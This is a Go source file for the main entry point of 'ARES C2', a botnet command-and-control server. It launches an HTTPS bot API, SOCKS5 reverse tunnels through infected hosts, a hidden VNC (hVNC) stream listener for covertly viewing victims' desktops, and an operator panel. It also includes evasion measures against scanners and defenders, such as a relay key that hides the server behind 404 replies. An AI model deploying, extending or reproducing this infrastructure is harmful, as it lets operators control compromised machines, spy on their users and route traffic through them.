/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES C2 SERVER — Main Entry Point (v2 — TLS + hVNC)
 *
 *  Services:
 *    1. HTTPS C2 listener   (:443)  — TLS encrypted
 *    2. Tunnel listener     (:9090) — SOCKS5 reverse tunnels
 *    3. hVNC listener       (:9091) — Pixel stream from bots
 *    4. SOCKS5 relay        (:1080) — Operator proxy
 *    5. Web panel + hVNC viewer (embedded)
 * ═══════════════════════════════════════════════════════════════
 */

package main

import (
	"ares-c2/internal/handler"
	"ares-c2/internal/relay"
	"crypto/rand"
	"crypto/subtle"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"
)

func main() {
	// ── CLI Flags ──
	httpPort := flag.Int("port", 443, "HTTPS C2 listener port")
	tunnelPort := flag.Int("tunnel-port", 9090, "Reverse tunnel listener port")
	hvncPort := flag.Int("hvnc-port", 9091, "hVNC stream listener port")
	socksPort := flag.Int("socks-port", 1080, "SOCKS5 relay port for operator")
	dataDir := flag.String("data", "./data", "Data storage directory")
	authToken := flag.String("token", "", "Panel auth token (auto-generated if empty)")
	noTLS := flag.Bool("no-tls", false, "Disable TLS (use HTTP instead of HTTPS, UNSAFE — local test only)")
	bindAddr  := flag.String("bind", "127.0.0.1", "Bind address (default: localhost only, use 0.0.0.0 for direct access)")
	relayKey  := flag.String("relay-key", "", "CF relay key: X-CF-Secret header value (blocks direct bot connections)")
	flag.Parse()

	// ── Generate auth token if not provided ──
	if *authToken == "" {
		b := make([]byte, 16)
		rand.Read(b)
		*authToken = hex.EncodeToString(b)
	}

	os.MkdirAll(*dataDir, 0755)

	// ── Banner ──
	fmt.Println(`
    ╔═══════════════════════════════════════════╗
    ║     ☠  ARES C2 — Command & Control  ☠     ║
    ║                                           ║
    ║   Native Framework v2.1 — TLS + hVNC      ║
    ║   "Tạm biệt C# — Chào mừng Ring-0"      ║
    ╚═══════════════════════════════════════════╝`)
	fmt.Println()

	proto := "HTTPS"
	if *noTLS {
		proto = "HTTP"
	}

	log.Printf("[*] %s C2 listener:   0.0.0.0:%d", proto, *httpPort)
	log.Printf("[*] Tunnel listener:    127.0.0.1:%d", *tunnelPort)
	log.Printf("[*] hVNC listener:      127.0.0.1:%d", *hvncPort)
	log.Printf("[*] SOCKS5 relay:       127.0.0.1:%d", *socksPort)
	log.Printf("[*] Data directory:     %s", *dataDir)
	/* v3.3: Mask token in log — show only first 8 chars */
	maskedToken := *authToken
	if len(maskedToken) > 8 {
		maskedToken = maskedToken[:8] + "********"
	}
	log.Printf("[*] Panel auth token:   %s", maskedToken)
	fmt.Println()

	// ── Initialize Components ──

	// 1. SOCKS5 Relay
	socks5Relay := relay.NewSocks5Relay(*socksPort)

	// 2. Tunnel Listener
	tunnelListener := relay.NewTunnelListener(socks5Relay)
	if err := tunnelListener.Start(*tunnelPort); err != nil {
		log.Fatalf("[!] Tunnel listener failed: %v", err)
	}

	// 3. hVNC Manager
	hvncManager := relay.NewHVNCManager()
	if err := hvncManager.StartStreamListener(*hvncPort); err != nil {
		log.Fatalf("[!] hVNC listener failed: %v", err)
	}

	// 4. HTTP/HTTPS Handler
	c2Handler := handler.NewC2Handler(*dataDir, *authToken)
	// v3.9: Restore bots from previous session
	if n := c2Handler.Store.LoadFromDisk(); n > 0 {
		log.Printf("[+] Restored %d bots from disk", n)
	}
	mux := http.NewServeMux()
	c2Handler.RegisterRoutes(mux)
	hvncManager.RegisterHTTPHandlers(mux, *authToken) // Add hVNC routes (with auth)

	// 5. Server
	/* v3.2: Security headers middleware */
	secureMux := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("X-XSS-Protection", "1; mode=block")
		w.Header().Set("Cache-Control", "no-store")
		/* v3.2: Request body size limit (10MB) to prevent memory exhaustion */
		r.Body = http.MaxBytesReader(w, r.Body, 10*1024*1024)
		/* v4.0: Cloudflare Relay Key check — when set, bot API requests
		 *  must include X-CF-Secret matching the relay key.
		 *  Panel routes (/api/panel/...) are always authenticated separately.
		 *  Blocks adversaries who discover the raw C2 IP. */
		if *relayKey != "" {
			isBotAPI := len(r.URL.Path) >= 7 && r.URL.Path[:7] == "/api/v1"
			if isBotAPI {
				got := r.Header.Get("X-CF-Secret")
				if subtle.ConstantTimeCompare([]byte(got), []byte(*relayKey)) != 1 {
					http.Error(w, "", http.StatusNotFound) // 404 not 403 — reduce fingerprint
					return
				}
			}
		}
		mux.ServeHTTP(w, r)
	})

	server := &http.Server{
		Addr:         fmt.Sprintf("%s:%d", *bindAddr, *httpPort),
		Handler:      secureMux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  120 * time.Second,
		MaxHeaderBytes: 1 << 20, /* v3.2: 1MB max header size */
	}

	// ── Start Server ──
	go func() {
		if *noTLS {
			log.Printf("[+] HTTP server starting on 0.0.0.0:%d", *httpPort)
			if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Fatalf("[!] HTTP server error: %v", err)
			}
		} else {
			// Generate/load TLS certificate
			certPath, keyPath, err := GenerateSelfSignedCert(*dataDir)
			if err != nil {
				log.Fatalf("[!] TLS cert generation failed: %v", err)
			}

			// v5.0 FIX H-22: Warn about self-signed cert fingerprinting risk
			log.Println("[!] ⚠ WARNING: Using SELF-SIGNED TLS certificate")
			log.Println("[!]   → Easily fingerprinted by Shodan/Censys")
			log.Println("[!]   → Blocked by enterprise proxies/firewalls")
			log.Println("[!]   → Use Let's Encrypt or Cloudflare Origin cert for production")

			tlsConfig, err := CreateTLSConfig(certPath, keyPath)
			if err != nil {
				log.Fatalf("[!] TLS config failed: %v", err)
			}
			server.TLSConfig = tlsConfig

			log.Printf("[+] HTTPS server starting on 0.0.0.0:%d (TLS 1.2+)", *httpPort)
			if err := server.ListenAndServeTLS(certPath, keyPath); err != nil && err != http.ErrServerClosed {
				log.Fatalf("[!] HTTPS server error: %v", err)
			}
		}
	}()

	log.Println("[+] All services started. Waiting for bots...")
	fmt.Println()

	scheme := "https"
	if *noTLS {
		scheme = "http"
	}
	log.Printf("[*] Panel URL:   %s://127.0.0.1:%d/", scheme, *httpPort)
	log.Printf("[*] hVNC viewer: %s://127.0.0.1:%d/hvnc/viewer/<bot_id>", scheme, *httpPort)
	log.Printf("[*] Bot API:     %s://0.0.0.0:%d/api/v1/register", scheme, *httpPort)
	fmt.Println()

	// ── Graceful Shutdown ──
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	log.Println("\n[!] Shutting down...")
	tunnelListener.Stop()
	socks5Relay.Stop()
	hvncManager.Stop()
	server.Close()
	log.Println("[*] Goodbye.")
}
